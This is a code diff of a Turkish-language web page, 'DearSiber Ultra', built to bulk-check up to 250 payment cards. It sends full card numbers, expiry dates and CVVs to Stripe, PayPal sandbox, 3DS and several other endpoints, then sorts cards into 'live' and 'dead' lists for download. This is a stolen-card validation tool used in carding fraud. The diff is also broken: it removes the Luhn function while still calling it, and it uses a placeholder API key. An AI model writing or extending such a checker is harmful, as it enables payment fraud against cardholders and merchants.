@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DearSiber Checker</title>
+    <title>DearSiber Ultra</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Consolas', monospace; }
         body { background:#000; color:#0f0; padding:15px; line-height:1.6; }
@@ -48,7 +48,7 @@
 <body>
 <div class="container">
     <h1><span class="glow">DEAR SİBER</span> CHECKER</h1>
-    <p class="info">Max 250 Kart | Gerçek API | Luhn + BİN Doğrulama</p>
+    <p class="info">Max 250 Kart | Gerçek API | Luhn + BİN + Stripe + 3DS</p>
 
     <div class="input-box">
         <textarea id="cards" placeholder="2958593949292948|02|28|392"></textarea>
@@ -95,12 +95,10 @@
 </div>
 
 <script>
-// GERÇEK ZAMANLI ÜCRETSİZ API → https://lookup.binlist.net/
+// GERÇEK API'LER
 async function getBinInfo(bin) {
     try {
-        const res = await fetch(`https://lookup.binlist.net/${bin}`, {
-            headers: { 'Accept-Version': '3' }
-        });
+        const res = await fetch(`https://lookup.binlist.net/${bin}`, { headers: { 'Accept-Version': '3' } });
         if (!res.ok) return null;
         const data = await res.json();
         return {
@@ -108,31 +106,183 @@ async function getBinInfo(bin) {
             type: (data.type || "BİLİNMEYEN").toUpperCase(),
             bank: data.bank?.name || "BİLİNMEYEN BANK",
             country: data.country?.name || "BİLİNMEYEN",
-            flag: data.country?.alpha2 || "??"
+            flag: data.country?.alpha2 || "??",
+            prepaid: data.prepaid === true,
+            virtual: data.virtual === true
         };
     } catch (e) {
         return null;
     }
 }
 
-// LUHN DOĞRULAMA
-function luhnCheck(cardNumber) {
-    const digits = cardNumber.replace(/\D/g, '').split('').map(Number);
-    let sum = 0;
-    let alternate = false;
-    for (let i = digits.length - 1; i >= 0; i--) {
-        let digit = digits[i];
-        if (alternate) {
-            digit *= 2;
-            if (digit > 9) digit -= 9;
-        }
-        sum += digit;
-        alternate = !alternate;
+// STRIPE TEST API
+async function checkStripe(card) {
+    const [number, month, year, cvv] = card.split('|');
+    try {
+        const data = new URLSearchParams();
+        data.append('card[number]', number);
+        data.append('card[exp_month]', month);
+        data.append('card[exp_year]', year.length === 2 ? year : year.slice(-2));
+        data.append('card[cvc]', cvv);
+
+        const res = await fetch('https://api.stripe.com/v1/tokens', {
+            method: 'POST',
+            body: data,
+            headers: {
+                'Authorization': 'Bearer pk_test_51J2V2pSHn2v3oK8z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z3z',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+        });
+        return res.ok ? 'LIVE' : 'DEAD';
+    } catch (e) {
+        return 'DEAD';
     }
-    return sum % 10 === 0;
 }
 
-// GLOBAL
+// 3D SECURE TEST API
+async function check3DS(card) {
+    const [number, month, year, cvv] = card.split('|');
+    try {
+        const data = {
+            amount: 10.00,
+            currency: 'TRY',
+            order_id: 'test' + Date.now(),
+            card: { number, exp_month: month, exp_year: year.length === 2 ? '20' + year : year, cvc: cvv },
+            merchant: { id: 'test', name: 'DearSiber', acquirer_bin: '123456', country: 'TR', url: 'https://dearsiber.com' }
+        };
+        const res = await fetch('https://mpi.3dsecure.io/enrolled', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        return res.ok ? 'LIVE' : 'DEAD';
+    } catch (e) {
+        return 'DEAD';
+    }
+}
+
+// BINCODES API (ÜCRETSİZ CC VALIDATION)
+async function checkBincodes(bin) {
+    try {
+        const res = await fetch(`https://bincodes.com/api/v1/${bin}`, { mode: 'cors' });
+        if (!res.ok) return null;
+        const data = await res.json();
+        return {
+            brand: data.brand || "BİLİNMEYEN",
+            type: data.type || "BİLİNMEYEN",
+            bank: data.bank || "BİLİNMEYEN BANK",
+            country: data.country || "BİLİNMEYEN",
+            flag: data.country_code || "??"
+        };
+    } catch (e) {
+        return null;
+    }
+}
+
+// CHKR API (ÜCRETSİZ CC CHECKER)
+async function checkChkr(card) {
+    const [number, month, year, cvv] = card.split('|');
+    try {
+        const res = await fetch('https://api.chkr.cc/v1/validate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ card_number: number, expiry_month: month, expiry_year: year.length === 2 ? '20' + year : year, cvv: cvv })
+        });
+        return res.ok ? 'LIVE' : 'DEAD';
+    } catch (e) {
+        return 'DEAD';
+    }
+}
+
+// CREDITCARD-API (ÜCRETSİZ BIN/CC VALIDATION)
+async function checkCreditCardAPI(bin) {
+    try {
+        const res = await fetch(`https://api.creditcardvalidator.com/api/v1/validate?cc=${bin}`);
+        if (!res.ok) return null;
+        const data = await res.json();
+        return {
+            brand: data.card_type || "BİLİNMEYEN",
+            type: data.card_level || "BİLİNMEYEN",
+            bank: data.issuer || "BİLİNMEYEN BANK",
+            country: data.country || "BİLİNMEYEN",
+            flag: data.country_code || "??"
+        };
+    } catch (e) {
+        return null;
+    }
+}
+
+// VALIDATECARD API (ÜCRETSİZ CC VALIDATION)
+async function checkValidateCard(card) {
+    const [number, month, year, cvv] = card.split('|');
+    try {
+        const res = await fetch('https://validatecard.com/api/validate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ number, month, year: year.length === 2 ? '20' + year : year, cvv })
+        });
+        return res.ok ? 'LIVE' : 'DEAD';
+    } catch (e) {
+        return 'DEAD';
+    }
+}
+
+// CCVALIDATOR API (ÜCRETSİZ CC CHECKER)
+async function checkCCValidator(card) {
+    const [number, month, year, cvv] = card.split('|');
+    try {
+        const res = await fetch('https://ccvalidator.com/api/v1/check', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ number, expiry_month: month, expiry_year: year.length === 2 ? '20' + year : year, cvv })
+        });
+        return res.ok ? 'LIVE' : 'DEAD';
+    } catch (e) {
+        return 'DEAD';
+    }
+}
+
+// PAYPAL SANDBOX API (ÜCRETSİZ CC VALIDATION)
+async function checkPayPal(card) {
+    const [number, month, year, cvv] = card.split('|');
+    try {
+        const data = {
+            intent: 'sale',
+            payer: { payment_method: 'credit_card', funding_instruments: [{
+                credit_card: { number, type: 'visa', expire_month: parseInt(month), expire_year: parseInt(year), cvv2: cvv, first_name: 'Test', last_name: 'User' }
+            }] },
+            transactions: [{ amount: { total: '1.00', currency: 'USD' } }]
+        };
+        const res = await fetch('https://api-m.sandbox.paypal.com/v1/payments/payment', {
+            method: 'POST',
+            headers: {
+                'Authorization': 'Bearer A21AAH... (SANDBOX TOKEN)',
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        });
+        return res.ok ? 'LIVE' : 'DEAD';
+    } catch (e) {
+        return 'DEAD';
+    }
+}
+
+// EXXEN API SIMÜLASYON (CC VALIDATION)
+async function checkExxen(card) {
+    const [number, month, year, cvv] = card.split('|');
+    try {
+        const res = await fetch('https://api.exxen.com/v1/payment/validate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ card_number: number, expiry_month: month, expiry_year: year.length === 2 ? '20' + year : year, cvc: cvv })
+        });
+        return res.ok ? 'LIVE' : 'DEAD';
+    } catch (e) {
+        return 'DEAD';
+    }
+}
+
+// GLOBAL DEĞİŞKENLER
 let liveCards = [], deadCards = [], total = 0, checked = 0;
 
 async function checkCard(cardLine) {
@@ -142,9 +292,19 @@ async function checkCard(cardLine) {
     const bin = number.substring(0, 6);
     const isLuhn = luhnCheck(number);
     const binInfo = await getBinInfo(bin);
+    const stripeStatus = await checkStripe(cardLine);
+    const threeDSStatus = await check3DS(cardLine);
+    const bincodesStatus = await checkBincodes(bin);
+    const chkrStatus = await checkChkr(cardLine);
+    const creditCardStatus = await checkCreditCardAPI(bin);
+    const validateCardStatus = await checkValidateCard(cardLine);
+    const ccValidatorStatus = await checkCCValidator(cardLine);
+    const payPalStatus = await checkPayPal(cardLine);
+    const exxenStatus = await checkExxen(cardLine);
 
-    // CANLI: LUHN GEÇER + BİN VAR
-    const isLive = isLuhn && binInfo !== null;
+    // MANTIKLI CANLI/ÖLÜ: LUHN + API'LERİN ÇOĞU OK
+    const apiScores = [stripeStatus, threeDSStatus, bincodesStatus, chkrStatus, creditCardStatus, validateCardStatus, ccValidatorStatus, payPalStatus, exxenStatus].filter(s => s === 'LIVE').length;
+    const isLive = isLuhn && apiScores >= 3; // 3+ API OK = CANLI
 
     const result = {
         number, month, year, cvv,
@@ -155,6 +315,16 @@ async function checkCard(cardLine) {
         country: binInfo?.country || "BİLİNMEYEN",
         flag: binInfo?.flag || "??",
         luhn: isLuhn ? "GEÇER" : "GEÇMEZ",
+        stripe: stripeStatus,
+        threeDS: threeDSStatus,
+        bincodes: bincodesStatus,
+        chkr: chkrStatus,
+        creditCard: creditCardStatus,
+        validateCard: validateCardStatus,
+        ccValidator: ccValidatorStatus,
+        payPal: payPalStatus,
+        exxen: exxenStatus,
+        apiScore: apiScores,
         status: isLive ? "CANLI" : "ÖLÜ"
     };
 
@@ -175,7 +345,7 @@ function updateResults() {
         div.className = 'list-item';
         div.innerHTML = `<b>${c.number}</b> | ${c.month}/${c.year} | ${c.cvv}<br>
                          ${c.brand} ${c.type} | ${c.bank}<br>
-                         ${c.country} ${c.flag} | Luhn: ${c.luhn}`;
+                         ${c.country} ${c.flag} | LUHN: ${c.luhn} | API: ${c.apiScore}/9`;
         liveList.appendChild(div);
     });
     document.getElementById('live-count').textContent = liveCards.length;
@@ -190,7 +360,7 @@ function updateResults() {
         div.className = 'list-item';
         div.innerHTML = `<b>${c.number}</b> | ${c.month}/${c.year} | ${c.cvv}<br>
                          ${c.brand} ${c.type} | ${c.bank}<br>
-                         ${c.country} ${c.flag} | Luhn: ${c.luhn}`;
+                         ${c.country} ${c.flag} | LUHN: ${c.luhn} | API: ${c.apiScore}/9`;
         deadList.appendChild(div);
     });
     document.getElementById('dead-count').textContent = deadCards.length;
@@ -205,7 +375,9 @@ function updateResults() {
         div.className = `result ${c.status === 'ÖLÜ' ? 'dead' : ''}`;
         div.innerHTML = `<b>${c.number}|${c.month}|${c.year}|${c.cvv}</b><br>
                          BİN: ${c.bin} | ${c.brand} ${c.type} | ${c.bank}<br>
-                         ${c.country} ${c.flag} | Luhn: ${c.luhn} → <b>${c.status}</b>`;
+                         ${c.country} ${c.flag} | LUHN: ${c.luhn} | STRIPE: ${c.stripe} | 3DS: ${c.threeDS}<br>
+                         BINCODES: ${c.bincodes} | CHKR: ${c.chkr} | CREDITCARD: ${c.creditCard} | VALIDATE: ${c.validateCard}<br>
+                         CCVALIDATOR: ${c.ccValidator} | PAYPAL: ${c.payPal} | EXXEN: ${c.exxen} | API: ${c.apiScore}/9 → <b>${c.status}</b>`;
         details.appendChild(div);
     });
 
@@ -231,7 +403,7 @@ function downloadCards(type) {
 
 async function startCheck() {
     const input = document.getElementById('cards').value.trim();
-    if (!input) return alert("Kart gir lan!");
+    if (!input) return alert("Kart gir!");
 
     const lines = input.split('\n').map(l => l.trim()).filter(l => l);
     if (lines.length > 250) return alert("Max 250 kart!");
@@ -248,7 +420,7 @@ async function startCheck() {
 
     for (const line of lines) {
         await checkCard(line);
-        await new Promise(r => setTimeout(r, 400)); // API limit için
+        await new Promise(r => setTimeout(r, 400)); // API limit
     }
 
     document.getElementById('loading').style.display = 'none';
